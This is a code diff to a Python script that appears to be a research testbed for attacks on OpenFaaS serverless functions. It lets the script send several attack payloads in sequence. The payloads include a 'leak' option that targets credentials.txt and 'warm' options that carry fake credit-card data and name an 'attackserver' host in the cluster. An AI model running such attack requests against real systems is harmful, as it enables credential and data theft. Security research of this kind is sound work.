@@ -12,17 +12,18 @@ def generate_uuid():
     return str(uuid.uuid4())
 
 
-def send_request(url, headers, data, request_type, uuid_dict):
+def send_request(url, headers, datas, request_type, uuid_dict):
     response_string = ""
-    try:
-        response = requests.post(url, headers=headers, data=json.dumps(data))
-        response_string = response.text
-        print(f"Status Code: {response.status_code}")
-    except Exception as e:
-        response_string = str(e)
-        print(f"Error: {e}")
-    finally:
-        uuid_dict[headers["uuid"]] = {"type": request_type, "resp": response_string}
+    for data in datas:
+        try:
+            response = requests.post(url, headers=headers, data=json.dumps(data))
+            response_string = response.text
+            print(f"Status Code: {response.status_code}")
+        except Exception as e:
+            response_string = str(e)
+            print(f"Error: {e}")
+        finally:
+            uuid_dict[headers["uuid"]] = {"type": request_type, "resp": response_string}
 
 
 def perform_requests(
@@ -86,7 +87,7 @@ if __name__ == "__main__":
     )
     parser.add_argument(
         "--data_attack_type",
-        choices=["modify", "leak", "warm1", "warm2"],
+        choices=["modify", "leak", "warm1", "warm2", "warm"],
         required=True,
         help="Type of attack data",
     )
@@ -129,32 +130,34 @@ if __name__ == "__main__":
         "malicious": "sas6",
         "path": "credentials.txt",
     }
-    
+
     data_attack_warm_1 = {
-        "id":1,
-        "user":"alice",
-        "creditCard":"1234-5678-9",
-        "malicious":"one",
-        "attackserver":"attackserver.openfaas-fn.svc.cluster.local:8888"
+        "id": 1,
+        "user": "alice",
+        "creditCard": "1234-5678-9",
+        "malicious": "one",
+        "attackserver": "attackserver.openfaas-fn.svc.cluster.local:8888",
     }
-    
+
     data_attack_warm_2 = {
-        "id":1,
-        "user":"alice",
-        "creditCard":"1234-5678-9",
-        "malicious":"two",
-        "attackserver":"attackserver"
+        "id": 1,
+        "user": "alice",
+        "creditCard": "1234-5678-9",
+        "malicious": "two",
+        "attackserver": "attackserver",
     }
-    
+
     if args.data_attack_type == "modify":
-        data_attack = data_attack_modify
+        data_attack = [data_attack_modify]
     elif args.data_attack_type == "leak":
-        data_attack = data_attack_leak
+        data_attack = [data_attack_leak]
     elif args.data_attack_type == "warm1":
-        data_attack = data_attack_warm_1
+        data_attack = [data_attack_warm_1]
     elif args.data_attack_type == "warm2":
-        data_attack = data_attack_warm_2
-        
+        data_attack = [data_attack_warm_2]
+    elif args.data_attack_type == "warm":
+        data_attack = [data_attack_warm_1, data_attack_warm_2]
+
     perform_requests(
         url,
         headers_benign_template,
